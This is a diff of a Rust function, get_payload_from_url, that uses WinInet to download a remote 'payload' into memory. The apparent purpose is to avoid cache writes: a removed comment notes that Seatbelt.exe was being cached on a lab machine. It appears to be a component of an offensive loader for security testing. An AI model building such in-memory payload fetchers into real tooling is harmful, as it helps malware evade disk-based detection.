@@ -1,12 +1,15 @@
-use std::{ffi::c_void, fmt::Display};
+use std::ffi::c_void;
 
 use windows::Win32::{
-    Foundation::{GetLastError, GENERIC_READ, S_OK},
+    Foundation::{GENERIC_READ, GetLastError},
     Networking::WinInet::{
-        InternetCloseHandle, InternetOpenUrlW, InternetOpenW, InternetReadFile, InternetReadFileExA, InternetReadFileExW, INTERNET_BUFFERSA, INTERNET_BUFFERSW, INTERNET_FLAG_KEEP_CONNECTION, INTERNET_OPEN_TYPE_PRECONFIG, IRF_ASYNC, IRF_SYNC, WININET_API_FLAG_SYNC
+        HTTP_QUERY_CONTENT_LENGTH, HttpQueryInfoA, INTERNET_BUFFERSA,
+        INTERNET_FLAG_KEEP_CONNECTION, INTERNET_FLAG_NO_CACHE_WRITE, INTERNET_OPEN_TYPE_PRECONFIG,
+        IRF_SYNC, InternetCloseHandle, InternetOpenUrlW, InternetOpenW, InternetReadFileExA,
     },
     Storage::FileSystem::{
-        CreateFileW, GetFileSizeEx, ReadFileEx, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ
+        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ,
+        GetFileSizeEx, ReadFileEx,
     },
     System::IO::OVERLAPPED,
 };
@@ -38,8 +41,6 @@ where
     buf
 }
 
-const BUFFER_SIZE: usize = 4096;
-
 pub fn get_payload_from_url<T: AsRef<str>>(url: T) -> Vec<u8>
 where
     BSTR: From<T>,
@@ -56,7 +57,7 @@ where
     };
 
     if handle_open.is_null() {
-        println!("InternetOpenW failed. {:?}", unsafe {GetLastError()});
+        println!("InternetOpenW failed. {:?}", unsafe { GetLastError() });
     }
 
     let handle_url = unsafe {
@@ -64,45 +65,53 @@ where
             handle_open,
             PCWSTR::from_raw(BSTR::from(url.clone()).into_raw()),
             None,
-            INTERNET_FLAG_KEEP_CONNECTION,
+            INTERNET_FLAG_NO_CACHE_WRITE,
             None,
         )
     };
 
     if handle_url.is_null() {
-        println!("InternetOpenUrlW failed. {:?} url: {}", unsafe {GetLastError()}, url.clone());
+        println!(
+            "InternetOpenUrlW failed. {:?} url: {}",
+            unsafe { GetLastError() },
+            url.clone()
+        );
     }
-    let mut buf = vec![];
-    let mut read_count = 0_u32;
 
-    // TODO 
-    // file saved location
-    //file: C:\Users\lab\AppData\Local\Microsoft\Windows\INetCache\IE\GX1L0OEV\Seatbelt[1].exe
-    loop {
-        let mut tmp_buf = vec![0_u8; BUFFER_SIZE];
-        unsafe {
-            InternetReadFile(
-                handle_url,
-                tmp_buf.as_mut_ptr() as *mut c_void,
-                BUFFER_SIZE as u32,
-                &mut read_count,
-            )
-        }
+    let content_length_buf = [0_u8; 32];
+    let mut buf_len = content_length_buf.len() as u32;
+    unsafe {
+        HttpQueryInfoA(
+            handle_url,
+            HTTP_QUERY_CONTENT_LENGTH,
+            Some(content_length_buf.as_ptr() as *mut c_void),
+            &mut buf_len,
+            None,
+        )
+        .unwrap();
+    }
+
+    let content_length_str = String::from_utf8(content_length_buf.to_vec()).unwrap();
+    let content_length = content_length_str
+        .trim_end_matches('\0')
+        .parse::<u64>()
         .unwrap();
 
-        tmp_buf.shrink_to(read_count as usize);
-        buf.push(tmp_buf);
+    let inner_buf = vec![0_u8; content_length as usize];
 
-        if read_count < BUFFER_SIZE as u32 {
-            break;
-        }
+    let mut internet_buffer = INTERNET_BUFFERSA::default();
+    internet_buffer.dwStructSize = size_of::<INTERNET_BUFFERSA>() as u32;
+    internet_buffer.lpvBuffer = inner_buf.as_slice().as_ptr() as *mut c_void;
+    internet_buffer.dwBufferLength = inner_buf.len() as u32;
+
+    unsafe {
+        InternetReadFileExA(handle_url, &mut internet_buffer, IRF_SYNC, None).unwrap();
     }
-
-    let buf = buf.concat();
 
     unsafe {
         let _ = InternetCloseHandle(handle_url);
         let _ = InternetCloseHandle(handle_open);
     }
-    buf
+
+    inner_buf
 }
